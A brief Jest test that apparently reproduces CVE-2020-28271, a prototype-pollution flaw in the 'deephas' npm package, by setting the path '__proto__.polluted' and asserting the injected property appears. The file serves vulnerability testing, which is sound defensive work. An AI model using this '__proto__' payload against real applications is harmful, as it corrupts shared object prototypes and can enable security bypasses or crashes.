//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2020-28271
test("prototype pollution in deephas ", () => {
    
    var dh = require("deephas");
    var obj = {}

    expect({}.polluted).toBe(undefined);
    

    dh.set(obj,'__proto__.polluted','yes');
    expect(obj.polluted).toBe("yes");
  });